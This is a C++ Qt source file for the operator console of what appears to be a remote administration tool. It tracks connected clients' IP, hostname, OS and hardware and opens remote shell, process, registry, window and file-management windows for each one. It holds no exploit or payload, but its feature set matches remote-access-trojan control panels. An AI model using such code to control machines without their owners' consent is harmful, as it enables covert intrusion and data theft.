#include "serverdlg.h"
#include "ui_serverdlg.h"
#include "cmddialog.h"
#include "windowdialog.h"
#include "processdialog.h"
#include "registrydialog.h"
#include "filedialog.h"
#include "tcpworker.h"

ServerDlg * __ServerDlg__ = nullptr;



ServerDlg::ServerDlg(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::ServerDlg)
{

    m_tcpServer = new TcpServer(this);
    ui->setupUi(this);
    m_model = new QStandardItemModel(this);
    SetClientTableView();
    __ServerDlg__ = this;

    connect(m_tcpServer, &TcpServer::DataPrased,this,&ServerDlg::HandlePacket);
    connect(m_tcpServer, &TcpServer::RemoveClient,this,&ServerDlg::RemoveClient);
}

ServerDlg::~ServerDlg()
{
    delete ui;
    delete m_model;
    delete m_tcpServer;
}

void ServerDlg::on_ListenButton_clicked()
{
    m_tcpServer->SetAddress("127.0.0.1",8756);
    m_tcpServer->IocpListen();
    ui->ListenButton->setDisabled(true);
}

void ServerDlg::SetClientTableView()
{
    QTableView *clientview = ui->ClientTableView;

    clientview->setEditTriggers(QAbstractItemView::NoEditTriggers);
    clientview->setSelectionBehavior(QAbstractItemView::SelectRows);
    clientview->setSelectionMode(QAbstractItemView::SingleSelection);

    m_model->setColumnCount(6);
    m_model->setHorizontalHeaderLabels({"IP", "计算机名","操作系统", "CPU", "显卡", "PING"});

    clientview->setFocusPolicy(Qt::NoFocus);
    clientview->setModel(m_model);
}



void ServerDlg::ClearClientTableView()
{
}


void ServerDlg::HandleClientLogin(CONTEXT_OBJECT *ctx)
{
    auto pkt = ctx->payload;
    QDataStream stream(&pkt, QIODevice::ReadOnly);
    LOGIN_INFORMAITON info;

    stream >> info.OSversion >> info.CPU >> info.Address >> info.HostName >> info.GPU >> info.WebSpeed ;
    info.socketDescriptor = ctx ->socket->socketDescriptor();
    AddLoginToClientTable(info);
}


void ServerDlg::AddLoginToClientTable(const LOGIN_INFORMAITON& info)
{
    int row = m_model->rowCount();
    m_model->insertRow(row);
    m_model->setItem(row,0,new QStandardItem(info.Address.toString()));
    m_model->setItem(row,1,new QStandardItem(info.HostName));
    m_model->setItem(row,2,new QStandardItem(info.OSversion));
    m_model->setItem(row,3,new QStandardItem(info.CPU));
    m_model->setItem(row,4,new QStandardItem(info.GPU));
    m_model->setItem(row,5,new QStandardItem(info.WebSpeed));
    QStandardItem* descriptor = m_model->item(row,0);
    descriptor->setData(info.socketDescriptor,Qt::UserRole);
}

void ServerDlg::RemoveClient(qintptr socketDescriptor)
{
    qDebug() << "[ServerDlg] Client disconnected:" << socketDescriptor;

    if (m_functionConnections.contains(socketDescriptor)) {
        auto connections = m_functionConnections[socketDescriptor];
        for (auto ctx : connections) {
            if (ctx->dialogHandle) {
                QWidget *dlg = reinterpret_cast<QWidget*>(ctx->dialogHandle);
                dlg->close();
                delete dlg;
                ctx->dialogHandle = nullptr;
            }
            delete ctx;
        }
        m_functionConnections.remove(socketDescriptor);
    }

    for (int row = 0; row < m_model->rowCount(); ++row) {
        QVariant data = m_model->item(row, 0)->data(Qt::UserRole);
        if (data.isValid() && data.toLongLong() == socketDescriptor) {
            m_model->removeRow(row);
            break;
        }
    }
}


void ServerDlg::on_CmdButton_clicked()
{
    CreateWorker(CMD_REQUIRE);
}

void ServerDlg::on_ProcessButton_clicked()
{
    CreateWorker(PROCESS_REQUIRE);
}

void ServerDlg::on_RegistryButton_clicked()
{
    CreateWorker(REGISTRY_REQUIRE);
}


void ServerDlg::on_WindowButton_clicked()
{
    CreateWorker(WINDOW_REQUIRE);
}
void ServerDlg::on_FileButton_clicked()
{
    qDebug()<<"clicked file button";
    CreateWorker(FILE_REQUIRE);
}

void ServerDlg::HandlePacket(CONTEXT_OBJECT *ctx)
{
    qDebug()<<"serverdlg is handeling";
    //数据处理
    if(ctx -> dialogIdentity != 0)
    {

        switch(ctx -> dialogIdentity)
        {
        case CMD_DIALOG:{
            CmdDialog *cmddialog = (CmdDialog*) ctx->dialogHandle;
            cmddialog -> HandlePacket(ctx -> isToken, ctx -> payload);
            break;
        }
        case WINDOW_DIALOG:{
            WindowDialog *windowdialog = (WindowDialog*) ctx->dialogHandle;
            windowdialog -> HandlePacket(ctx->isToken, ctx->payload);
            break;
        }
        case PROCESS_DIALOG:{
            ProcessDialog *processdialog = (ProcessDialog*) ctx->dialogHandle;
            processdialog -> HandlePacket(ctx->isToken, ctx->payload);
            break;
        }
        case REGISTRY_DIALOG:{
            RegistryDialog *registrydialog = (RegistryDialog*) ctx->dialogHandle;
            registrydialog -> HandlePacket(ctx->isToken, ctx->payload);
            break;
        }
        case FILE_DIALOG:{
            FileDialog *filedialog = (FileDialog*) ctx->dialogHandle;
            filedialog -> HandlePacket(ctx->isToken, ctx->payload);
            break;
        }
        }
    }
    //模块连接应答
    else
    {
        switch (ctx -> isToken)
        {
        case CLIENT_LOGIN:
            HandleClientLogin(ctx);
            break;
        case CMD_REPLY:
            qDebug()<<"CMD reply";
            HandleReply<CmdDialog,CMD_REQUIRE,CMD_DIALOG>(ctx);
            break;
        case WINDOW_REPLY:
            qDebug()<<"Window reply";
            HandleReply<WindowDialog,WINDOW_REQUIRE,WINDOW_DIALOG>(ctx);
            break;
        case PROCESS_REPLY:
            qDebug()<<"process reply";
            HandleReply<ProcessDialog,PROCESS_REQUIRE,PROCESS_DIALOG>(ctx);
            break;
        case REGISTRY_REPLY:
            qDebug()<<"registry reply";
            HandleReply<RegistryDialog,REGISTRY_REQUIRE,REGISTRY_DIALOG>(ctx);
            break;
        case FILE_REPLY:
            qDebug()<<"registry reply";
            HandleReply<FileDialog,FILE_REQUIRE,FILE_DIALOG>(ctx);
            break;
        default:
            qDebug() << "[ServerDlg] Unknown istoken:" << ctx -> isToken;
            break;
        }
    }
}

template<typename FuncClass,unsigned char isToken,unsigned char DialogID>
void ServerDlg::HandleReply(CONTEXT_OBJECT *ctx)
{

    //记录新的连接映射
    qDebug() << m_selectedDescriptor;
    m_functionConnections[m_selectedDescriptor][isToken] = ctx;
    //创建窗口并绑定
    TcpWorker * worker =  m_tcpServer->m_clients.value(ctx->socket->socketDescriptor());
    auto* dialog = new FuncClass(worker,ctx);
    dialog->show();

    ctx->dialogIdentity = DialogID;
    ctx->dialogHandle = dialog;

    qDebug() << "Created function window, identity =" << ctx->dialogIdentity
             << "handle ptr =" << ctx->dialogHandle;


}


void ServerDlg::CreateWorker(unsigned char isToken)
{
    auto SelectRow = ui->ClientTableView->selectionModel()->currentIndex();
    if(!SelectRow.isValid()) return;

    m_selectedDescriptor = m_model->item(SelectRow.row(),0)->data(Qt::UserRole).toLongLong();
    qDebug() << m_selectedDescriptor;

    auto funcMap = m_functionConnections[m_selectedDescriptor];

    if (funcMap.contains(isToken)) {
        CONTEXT_OBJECT* oldctx = funcMap[isToken];
        if (oldctx->dialogHandle) {
            qDebug()<<"funnction" <<isToken <<"for client"<<m_selectedDescriptor<<"already exists";
            auto win = qobject_cast<QWidget*>(oldctx->dialogHandle);
            win->raise();
            win->activateWindow();
            win->show();
            return;
        }

    }

    //新建功能类连接
    qDebug() << "[Server] Requesting client" << m_selectedDescriptor << "to create new  connection";
    TcpWorker *worker = m_tcpServer->m_clients.value(m_selectedDescriptor);
    CONTEXT_OBJECT * ctx = worker->GetContext();

    ctx->payload.clear();
    ctx->isToken = isToken;
    QMetaObject::invokeMethod(worker, "SendData", Qt::QueuedConnection);
}

void ServerDlg::closeEvent(QCloseEvent *event)
{
    QApplication::closeAllWindows();

}




